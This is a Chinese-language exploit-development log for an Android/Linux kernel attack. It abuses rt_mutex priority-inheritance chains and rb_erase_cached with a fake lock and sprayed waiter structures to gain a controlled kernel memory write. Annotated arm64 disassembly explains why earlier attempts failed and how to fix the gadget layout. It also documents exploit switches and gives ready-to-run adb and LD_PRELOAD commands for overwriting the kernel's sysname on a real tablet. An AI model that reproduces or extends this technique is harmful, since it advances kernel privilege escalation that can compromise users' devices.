# T2' 三个真断点（2026-10-26）

> 基于自建 `#38` ELF（121896 syms，与作者记录一致）做静态定位 + 真机对照。
> 仓库 `T2_UNLOCK_TREE_RESULT.md` 的"封档"结论**部分作废**：那批实验的 `sleep` 窗口
> 小于 KernelSnitch setup 时间（13s），根本没跑到 pselect 阶段，是假阴性。

## 0. 结论先行

| 之前的判断 | 实测/静态事实 | 影响 |
|---|---|---|
| `rb_erase` 在 PI walk 不可达 | **可达**。`rt_mutex_adjust_prio_chain+0x328 bl rb_erase_cached` 就在那里，只是入口条件没满足 | 整条 T2' 没有封档 |
| gadget 摆在 `pi_tree_entry(+0x18)` | dequeue 删的是 `tree_entry(+0x00)` | 已在 `TREE_ENTRY_GADGET` 修正 |
| `WRITE_ORACLE=uts` 观测 `GLORACLE` | **判据本质错误**：`rb_erase` 的每条 store 写的都是指针值，不存在"写常量" | 全部 `hit=0` 无意义 |
| `PSELECT_LOCK_CRASH` panic ⇒ chain 到达 | 只证明 `waiter->lock` 被读到（`+0x2f4 ldr [lock+0x10]` 立即解引用 0x41） | 到达判据要换 |

## 1. 真断点 A：`fake_lock->wait_lock` 必须已锁

`rt_mutex_adjust_prio_chain` 里有两处 `_raw_spin_trylock`，dequeue 段挂在**第二处失败**之后：

```
+0x02c8  mov   x0, x21              ; x21 = waiter->lock = fake_lock
+0x02cc  bl    _raw_spin_trylock
+0x02d0  cbnz  w0, +0x1d4           ; 成功 -> owner 循环，dequeue 整段被绕过
+0x02d4  mov   x0, x26
+0x02d8  bl    _raw_spin_unlock_irq
+0x02dc  yield
+0x02e4  bl    _raw_spin_lock_irq
+0x02e8  ldr   x25, [x19, #0x8d0]   ; 重读 task->pi_blocked_on
+0x02ec  cbnz  x25, +0x12c
+0x02f4  ldr   x8, [x21, #0x10]     ; ← 只在这条路上：lock->waiters.rb_leftmost
+0x02f8  cbz   x8, +0x1c0
+0x02fc  str   x8, [sp]
+0x0300  ldr   x8, [x8, #0x38]      ; leftmost->lock
+0x0304  cmp   x8, x21
+0x0308  b.eq  +0x314
+0x030c  b     +0x830              ; 不等 -> 退出
+0x0314  ldr   x8, [x25]            ; waiter->tree_entry.__rb_parent_color
+0x0318  cmp   x8, x25              ; RB_EMPTY_NODE ?
+0x031c  b.eq  +0x334              ; 空 -> 跳过 erase
+0x0320  add   x1, x21, #8          ; root = &lock->waiters.rb_root
+0x0324  mov   x0, x25
+0x0328  bl    rb_erase_cached      ; ← 写 gadget
```

`LOCK_OFF+0x00`（`wait_lock`）原来是 0，qspinlock 未锁 ⇒ trylock 必然成功 ⇒
**`rb_erase` 在之前的每一组实验里都没被执行过**。

开关：`FAKE_LOCK_HELD=1` 写 `wait_lock = 1`（qspinlock `_Q_LOCKED_VAL`）。

## 2. 真断点 B：写的是指针，不是常量

`rb_erase_cached` 是 `__rb_erase_augmented` 的完整内联体（252 条）。全部 store：

```
+0x0044  str  x10, [x8, #0x10]     ; parent->rb_left  = successor
+0x0048  str  x9,  [x11, #8]      ; child->rb_right  = ...
+0x0058  str  x12, [x9]           ; node->__rb_parent_color = child|color
+0x0080  str  x10, [x8]           ; *(node->rb_left) = __rb_parent_color   ← 可控值
+0x0094  str  x8,  [x9, #8]       ; parent->rb_right = node->rb_left
+0x00b8  str  x12, [x11]          ; node->__rb_parent_color 重写
+0x00d4  str  x9,  [x12, #8]
+0x00e0  str  x11, [x9]
+0x00e4  str  x8,  [x10]
+0x00ec  str  x9,  [x1]           ; root->rb_node = new
+0x0100  ...
+0x0128  str  x8,  [x1]           ; root->rb_node = tmp（parent==0 分支）
+0x0130  str  x8,  [x9, #0x10]
+0x0160  str  x11, [x10]
+0x0180  str  x9,  [x8, #8]
+0x0188  str  x10, [x9]
...
```

只有 `+0x0080` 那一条写的是 `__rb_parent_color` —— 一个 attacker 完全控制的 64 位值。
其余全是树里的指针。所以 `WRITE_ORACLE=uts` 期待 `sysname` 里出现 `GLORACLE` 这种 ASCII
标记，从原理上不可能命中（除了 `+0x0080` 这一条）。

## 3. 真断点 C：`parent == 0` 会污染 `rb_root`

`+0x0080` 写完后：

```
+0x0084  b.eq  +0x128        ; parent == 0
+0x0128  str   x8, [x1]      ; root->rb_node = node->rb_left（= 我们的写目标）
+0x012c  ret
```

回到 chain：

```
+0x0348  ldr   x13, [x1, #8]!    ; x1 已被 +0x320 设为 &lock->waiters.rb_root
+0x034c  cbz   x13, +0x27c
+0x0358  ldr   w11, [x13, #0x40] ; 读 (写目标)+0x40
+0x0370  ldr   x13, [x13, x11]   ; 顺着垃圾指针走
```

`rb_root` 被改成写目标（UTS sysname），随后 dequeue 尾部把 waiter 重新插回树时会在这条
垃圾路径上遍历 —— 实测必崩（`bootreason=cold`）。

**因此不能让 `parent == 0`。** 让 `parent_color` 指向自己的 spray 页：

```
parent_color = scratch_va         (payload_base + SCRATCH_OFF)
rb_right     = 0
rb_left      = 写目标
```

走 `+0x88`→`+0x94`：写**非零**值到目标，随后两次解引用都落在 scratch 页内，`rb_root`
保持 `fake_w0` 不被污染。开关：`SCRATCH_PARENT_GADGET=1`。

## 4. 当前代码状态（`exploit/src/util.c`）

| 开关 | 作用 |
|---|---|
| `TREE_ENTRY_GADGET=1` | craft 摆到 `tree_entry(+0x00)`（原在 `pi_tree_entry`） |
| `FAKE_LOCK_HELD=1` | `wait_lock=1`，逼 trylock 失败进入 dequeue 段 |
| `NULL_WRITE_GADGET=1` | `parent_color=0`，写 8 字节 0（会污染 rb_root，对照组用） |
| `SCRATCH_PARENT_GADGET=1` | `parent_color=scratch_va`，写非零且不污染 rb_root |
| `WRITE_ORACLE=uts_null` | 目标=`init_uts_ns.name.sysname`，值 0，判据=sysname 变空 |
| `FAKE_TASK_PI_WAITERS_SPRAY` / `FAKE_TASK_BLOCKED_ON_SPRAY` | chain 全程留在 spray 数据上 |

## 5. 未完成 / 阻塞

- 新 `preload.so`（180968 B，md5 `c534fef0…4c55d`）**没能推到设备**：
  `adb push` 报成功但落盘 0 字节；`exec-out` stdin 重定向在本机 Git Bash 下不生效；
  base64 分块每块要 4 次重启 server，31 块跑不完。
- 设备侧 `adbd` 现已不响应 shell（USB 枚举仍在 `18d1:4ee2`），需要物理重启平板。
- `PSELECT_SHIFT_OVERRIDE` 全量扫描（-3..23）只跑到 15/17 两档，**15 命中 panic**
  （`bootreason=kernel_panic,fatal_exception`），说明 shift=15 的覆盖位置是对的。

## 6. 复现命令（设备恢复后）

```bash
# 1. 传 so（adb 恢复后）
adb push out/exploit/aarch64/preload.so /data/local/tmp/exploit/aarch64/

# 2. 干净版零写（预期 panic，证明 write 已落地但 rb_root 被污染）
adb shell 'cd /data/local/tmp/exploit/aarch64 && WRITE_ORACLE=uts_null NULL_WRITE_GADGET=1 \
  FAKE_LOCK_HELD=1 USE_FAKE_TASK=1 FAKE_TASK_PI_WAITERS_SPRAY=1 FAKE_TASK_BLOCKED_ON_SPRAY=1 \
  PI_CONSUMER=sched_setattr LD_PRELOAD=./preload.so /system/bin/sleep 28'

# 3. scratch-parent 版（预期存活 + sysname 被写成内核地址）
adb shell 'cd /data/local/tmp/exploit/aarch64 && WRITE_ORACLE=uts SCRATCH_PARENT_GADGET=1 \
  FAKE_LOCK_HELD=1 USE_FAKE_TASK=1 FAKE_TASK_PI_WAITERS_SPRAY=1 FAKE_TASK_BLOCKED_ON_SPRAY=1 \
  PI_CONSUMER=sched_setattr LD_PRELOAD=./preload.so /system/bin/sleep 28'
uname -s    # 判据
```

**注意**：`sleep` 必须 ≥ 22s。KernelSnitch setup 要 ~13s，短于此窗口的实验全部无效
（这是本轮推翻"封档"结论的直接原因）。
